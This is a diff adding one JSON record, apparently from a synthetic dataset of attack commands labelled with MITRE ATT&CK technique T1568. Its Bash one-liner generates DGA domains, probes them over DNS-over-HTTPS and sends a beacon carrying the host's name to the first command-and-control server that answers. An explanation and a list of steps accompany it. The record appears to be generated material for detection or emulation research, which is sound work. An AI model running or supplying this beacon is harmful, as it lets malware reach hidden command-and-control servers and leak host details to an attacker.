@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"gamma\"; TLDs=(com net biz io); for i in $(seq 1 6); do LABEL=$(printf \"%s\" \"${SEED}$(date -u +%Y%m%d)$i\" | sha256sum | cut -c1-16); FQDN=\"${LABEL}.status-sync.${TLDs[$RANDOM%${#TLDs[@]}]}\"; if curl --doh-url https://dns.google/dns-query -sSfI --connect-timeout 2 \"https://${FQDN}:4433/health\"; then curl --doh-url https://dns.google/dns-query -sS \"https://${FQDN}:4433/beacon\" -H \"X-Node: $(hostname)\" -H \"X-TS: $(date +%s)\"; break; fi; sleep $((RANDOM%3+1)); done",
+  "explanation": "Iteratively generates multiple DGA domains and uses DoH to probe for a live C2 endpoint over port 4433, then sends a beacon once connectivity is confirmed.",
+  "rationale_steps": [
+    "Create several DGA candidates per run",
+    "Resolve and probe via DoH using curl HEAD",
+    "Select the first responsive domain",
+    "Beacon to C2 over irregular TLS port 4433"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-d5bd28db",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
